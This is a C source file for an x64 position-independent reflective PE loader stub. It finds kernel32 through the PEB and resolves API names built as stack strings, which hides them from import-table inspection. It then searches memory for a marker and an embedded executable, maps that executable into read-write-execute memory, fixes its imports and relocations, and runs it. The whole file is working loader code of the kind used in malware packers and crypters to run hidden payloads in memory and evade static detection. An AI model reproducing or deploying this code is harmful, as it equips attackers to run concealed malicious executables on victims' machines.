#include <windows.h>
#include <winternl.h>

/**
 * stub.c - x64 Position Independent Reflective Loader
 */

typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_CUSTOM, *PLDR_DATA_TABLE_ENTRY_CUSTOM;

// Section names for ordering
#define SECTION_ENTRY __attribute__((naked, section(".text$00")))
#define SECTION_FUNC  __attribute__((section(".text$01")))

// Prototypes
SECTION_ENTRY void entry();
SECTION_FUNC void stub_entry();
void stub_main() __attribute__((used, section(".text$01")));
static void* get_module_base(const char* name) __attribute__((section(".text$01")));
static void* get_proc_address(void* module, const char* name) __attribute__((section(".text$01")));
static int strings_equal(const char* s1, const char* s2) __attribute__((section(".text$01")));

SECTION_ENTRY
void entry() {
    __asm__("jmp stub_entry");
}

__attribute__((naked, section(".text$01")))
void stub_entry() {
    __asm__ volatile (
        "sub $0x28, %rsp\n"
        "call stub_main\n"
        "add $0x28, %rsp\n"
        "ret\n"
    );
}

SECTION_FUNC
void stub_main() {
    void* k32 = get_module_base(NULL);
    if (!k32) return;

    char sGetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    char sLoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    char sGetModuleHandleA[] = {'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A',0};

    typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
    typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
    typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef HMODULE (WINAPI *GetModuleHandleA_t)(LPCSTR);

    GetProcAddress_t pGetProcAddress = (GetProcAddress_t)get_proc_address(k32, sGetProcAddress);
    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)pGetProcAddress((HMODULE)k32, sLoadLibraryA);
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)pGetProcAddress((HMODULE)k32, sVirtualAlloc);
    GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t)pGetProcAddress((HMODULE)k32, sGetModuleHandleA);

    unsigned long long marker = 0xDEADBEEFCAFEBABEULL;
    void* rip_ptr;
    __asm__ ("lea (%%rip), %0" : "=r" (rip_ptr));

    char* search = (char*)rip_ptr;
    int found = 0;
    for (int i = 0; i < 1024 * 1024; i++) {
        if (*(unsigned long long*)search == marker) {
            if (*(unsigned short*)(search + 8) == 0x5A4D) {
                search += 8; found = 1; break;
            }
        }
        search++;
    }
    if (!found) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)search;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(search + dos->e_lfanew);

    char* image_base = (char*)pVirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!image_base) return;

    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++) image_base[i] = search[i];

    PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((char*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        char* dest = image_base + sections[i].VirtualAddress;
        char* src = search + sections[i].VirtualAddress;
        for (DWORD j = 0; j < sections[i].SizeOfRawData; j++) dest[j] = src[j];
    }

    PIMAGE_NT_HEADERS new_nt = (PIMAGE_NT_HEADERS)(image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew);

    // Fix Imports
    if (new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)(image_base + new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (import_desc->Name) {
            HMODULE hMod = pLoadLibraryA(image_base + import_desc->Name);
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(image_base + import_desc->FirstThunk);
            PIMAGE_THUNK_DATA orig_thunk = (PIMAGE_THUNK_DATA)(image_base + import_desc->OriginalFirstThunk);
            if (!import_desc->OriginalFirstThunk) orig_thunk = thunk;
            while (orig_thunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) thunk->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
                else thunk->u1.Function = (ULONG_PTR)pGetProcAddress(hMod, ((PIMAGE_IMPORT_BY_NAME)(image_base + orig_thunk->u1.AddressOfData))->Name);
                thunk++; orig_thunk++;
            }
            import_desc++;
        }
    }

    // Fix Relocations
    ULONG_PTR delta = (ULONG_PTR)image_base - new_nt->OptionalHeader.ImageBase;
    if (delta != 0 && new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(image_base + new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress != 0) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* list = (WORD*)((char*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; i++) {
                if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)(image_base + reloc->VirtualAddress + (list[i] & 0xFFF)) += delta;
                else if ((list[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)(image_base + reloc->VirtualAddress + (list[i] & 0xFFF)) += (DWORD)delta;
            }
            reloc = (PIMAGE_BASE_RELOCATION)((char*)reloc + reloc->SizeOfBlock);
        }
    }

    // x64 Exception Support
    IMAGE_DATA_DIRECTORY exception_dir = new_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (exception_dir.Size > 0) {
        char sNtdll[] = {'n','t','d','l','l','.','d','l','l',0};
        char sRtlAddFunctionTable[] = {'R','t','l','A','d','d','F','u','n','c','t','i','o','n','T','a','b','l','e',0};
        typedef BOOL (WINAPI *RAFA)(PRUNTIME_FUNCTION, DWORD, DWORD64);
        RAFA pRtlAddFunctionTable = (RAFA)pGetProcAddress(pGetModuleHandleA(sNtdll), sRtlAddFunctionTable);
        if (pRtlAddFunctionTable) pRtlAddFunctionTable((PRUNTIME_FUNCTION)(image_base + exception_dir.VirtualAddress), exception_dir.Size / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)image_base);
    }

    ((void(*)())(image_base + new_nt->OptionalHeader.AddressOfEntryPoint))();
}

SECTION_FUNC
static void* get_module_base(const char* name) {
    PPEB peb;
    __asm__ ("movq %%gs:0x60, %0" : "=r" (peb));
    PLIST_ENTRY list = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = list->Flink; // exe
    entry = entry->Flink; // ntdll
    entry = entry->Flink; // kernel32
    return ((PLDR_DATA_TABLE_ENTRY_CUSTOM)((char*)entry - sizeof(LIST_ENTRY)))->DllBase;
}

SECTION_FUNC
static void* get_proc_address(void* module, const char* name) {
    char* base = (char*)module;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + ((PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    DWORD* funcs = (DWORD*)(base + exports->AddressOfFunctions);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exports->NumberOfNames; i++) if (strings_equal(base + names[i], name)) return base + funcs[ordinals[i]];
    return 0;
}

SECTION_FUNC
static int strings_equal(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return (unsigned char)*s1 == (unsigned char)*s2;
}
